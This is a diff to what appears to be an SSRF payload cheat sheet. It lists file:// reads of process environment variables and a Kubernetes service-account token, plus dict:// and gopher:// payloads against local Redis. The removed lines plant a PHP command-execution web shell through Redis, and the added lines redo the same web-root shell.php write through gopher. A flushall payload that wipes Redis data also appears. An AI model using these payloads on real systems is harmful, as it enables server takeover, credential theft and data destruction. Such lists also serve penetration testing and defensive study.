@@ -132,12 +132,12 @@ file:///proc/self/environ
 file:///var/run/secrets/kubernetes.io/serviceaccount/token
 
 # Dict protocol - service probing
-dict://127.0.0.1:6379/info          # Redis info
+dict://127.0.0.1:6379/info          # Redis info (dict wraps as DEFINE)
 dict://127.0.0.1:11211/stats        # Memcached stats
-dict://127.0.0.1:6379/set shell "<?php system($_GET['c']);?>"
-dict://127.0.0.1:6379/config set dir /var/www/html
-dict://127.0.0.1:6379/config set dbfilename shell.php
-dict://127.0.0.1:6379/save
+# Note: dict:// wraps commands as DEFINE database "word"; gopher:// is preferred for Redis:
+gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
+gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php
+gopher://127.0.0.1:6379/_SAVE
 
 # Gopher protocol - raw TCP to any service
 gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
